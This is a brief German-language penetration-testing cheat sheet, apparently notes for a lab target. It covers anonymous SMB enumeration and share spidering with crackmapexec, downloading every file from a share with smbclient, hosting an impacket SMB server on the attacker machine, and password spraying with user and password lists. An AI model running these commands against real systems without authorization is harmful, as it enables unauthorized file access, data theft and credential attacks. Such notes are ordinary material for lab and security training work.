# smb-shares
Eine json-Auflistung aller Files herunterladen und in /tmp speichern.
```bash
poetry run crackmapexec smb 10.10.10.219 -u '' -p '' -M spider_plus
```

## NULL-Authentication
```bash
poetry run crackmapexec smb 10.10.10.219 -u '' -p ''
smbclient -N //10.10.10.219/kanban
```

## Download all Files
```bash
smbclient -N //10.10.10.219/kanban
mget *
```


## Linux-smbshare
```bash
┌──(fuchs㉿kali)-[~]
└─$ impacket-smbserver -smb2support -user fuchs -password bau name_share $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

# Password Spraying
je eine Datei für Nutzer und Kennwörter
```bash
poetry run crackmapexec smb 10.10.10.219 -u user.txt -p password.txt